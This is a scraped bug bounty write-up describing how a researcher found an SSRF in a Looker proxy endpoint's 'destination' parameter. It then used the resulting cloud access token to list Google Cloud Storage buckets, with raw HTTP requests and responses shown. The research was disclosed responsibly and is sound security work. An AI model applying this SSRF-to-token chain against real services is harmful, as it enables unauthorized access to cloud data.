---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-12_ssrfgvrp-for-5000.md
original_filename: 2022-09-12_ssrfgvrp-for-5000.md
title: SSRF(g/vrp) for 5000$
category: documents
detected_topics:
- idor
- access-control
- ssrf
- command-injection
- otp
- rate-limit
tags:
- imported
- documents
- idor
- access-control
- ssrf
- command-injection
- otp
- rate-limit
language: en
raw_sha256: cec62c963d2d697438323eb060101427fc6da1db8982d387a556d4a75d290c58
text_sha256: 4529e50c1e4d9136bd071e7111d88925bb14e12e05f14f80268854e5eef80f2c
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: true
---

# SSRF(g/vrp) for 5000$

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-12_ssrfgvrp-for-5000.md
- Source Type: markdown
- Detected Topics: idor, access-control, ssrf, command-injection, otp, rate-limit
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: True
- Raw SHA256: `cec62c963d2d697438323eb060101427fc6da1db8982d387a556d4a75d290c58`
- Text SHA256: `4529e50c1e4d9136bd071e7111d88925bb14e12e05f14f80268854e5eef80f2c`


## Content

---
title: "SSRF(g/vrp) for 5000$"
url: "https://0x01alka.medium.com/ssrf-g-vrp-for-5000-d08c8f515c95"
authors: ["lalka (@0x01alka)"]
bugs: ["SSRF"]
bounty: "5,000"
publication_date: "2022-09-12"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2180
scraped_via: "browseros"
---

# SSRF(g/vrp) for 5000$

SSRF(g/vrp) for 5000$
lalka
Follow
3 min read
·
Sep 12, 2022

188

2

Hi.

Short writeup about finding on g/vrp.

Initial scope of my interest:

Google’s acquisitions(*.looker.com)

Recon tools for subdomains enumeration and cleaning up noise:

1. Amass
2. subfinder
3. gau
4. github-subdomains.py from https://github.com/gwen001/github-search
5. httpx

Visualization:

1. Webscreenshot from https://github.com/maaaaz/webscreenshot

Entry point:

https://connect.looker.com

After initial payload probe in search form on connect.looker.com caught a request to an interesting host that I had not seen before:

Press enter or click to view image in full size

OPTIONS /proxy?key={key}&destination={destination} HTTP/2
Host: lms-api-cz6r7c0o.uc.gateway.dev
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: */*
Metadata-Flavor: Google
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Access-Control-Request-Method: POST
Access-Control-Request-Headers: x-algolia-api-key,x-algolia-application-id
Referer: https://connect.looker.com/
Origin: https://connect.looker.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Te: trailers

Hmm, *.gateway.dev

Google/RTFM → looks like it “Google Cloud API Gateway”. Interesting.

The “destination” parameter turned out to be vulnerable to the purest SSRF.

Press enter or click to view image in full size

Nice.

Next question -> What we can do with “access_token”?

Google/RTFM -> great research https://www.youtube.com/watch?v=UyemBjyQ4qA from David Schütz. (Strongly recommend to watch :3)

________________________________________________________________

Let’s get to the application files stored somewhere in the bucket

Get lalka’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Request:

GET /storage/v1/b?alt=json&project=kitchen-table-prod HTTP/2
Host: storage.googleapis.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
Authorization: Bearer OUR_ACCESS_TOKEN
Content-Length: 0

Responce:

HTTP/2 200 OK
X-Guploader-Uploadid: ADPycduRvI_zxTOI1UixqkIno1Gj6m0MCj0hGJwYum7e0u4XXCzk0p1FGRBl***REDACTED-SUSPECT-TOKEN***Content-Type: application/json; charset=UTF-8
Date: Sat, 02 Apr 2022 22:40:43 GMT
Vary: Origin
Vary: X-Origin
Cache-Control: private, max-age=0, must-revalidate, no-transform
Expires: Sat, 02 Apr 2022 22:40:43 GMT
Content-Length: 6158
Server: UploadServer
Alt-Svc: h3=”:443"; ma=2592000,h3–29=”:443"; ma=2592000,h3-Q050=”:443"; ma=2592000,h3-Q046=”:443"; ma=2592000,h3-Q043=”:443"; ma=2592000,quic=”:443"; ma=2592000; v=”46,43"

…

{
“kind”: “storage#bucket”,
“selfLink”: “https://www.googleapis.com/storage/v1/b/looker-lms-prod-tf-backend",
“id”: “looker-lms-prod-tf-backend”,
“name”: “looker-lms-prod-tf-backend”,
“projectNumber”: “1016965839768”,
“metageneration”: “1”,
“location”: “US”,
“storageClass”: “STANDARD”,
“etag”: “CAE=”,
“defaultEventBasedHold”: false,
“timeCreated”: “2021–02–08T01:22:20.140Z”,
“updated”: “2021–02–08T01:22:20.140Z”,
“iamConfiguration”: {
“bucketPolicyOnly”: {
“enabled”: true,
“lockedTime”: “2021–05–09T01:22:20.140Z”
},
“uniformBucketLevelAccess”: {
“enabled”: true,
“lockedTime”: “2021–05–09T01:22:20.140Z”
},
“publicAccessPrevention”: “inherited”
},
“locationType”: “multi-region”,
“satisfiesPZS”: false,
“rpo”: “DEFAULT”
}

…

_________________________________________________________________

Since I entered previously unknown territory, I requested permission for further research. Since we are ̶c̶o̶o̶l̶ ̶h̶a̶c̶k̶e̶r̶s̶ neat scriptkiddies, I preferred to stick to the principle of “primum non nocere”.

Further it is not interesting.

The report was accepted, triaged.

I rubbed my hands in anticipation of good money.

Then I received confirmation that I had been paid $500.

At first I was upset.

Then a letter came that we are awarding you an additional $4,500

Then I rejoiced.

Such are the everyday life of a bughunter.

Press enter or click to view image in full size

_________________________________________________________________

Timeline:

- Reported Mar 31, 2022
- Triaged Apr 1, 2022
- Nice catch! Apr 25, 2022
- 500$ Apr 26, 2022
- +4500$ May 17, 2022
- Get permission to publish writeup Sep 6, 2022

Thanks for reading.

Regards.
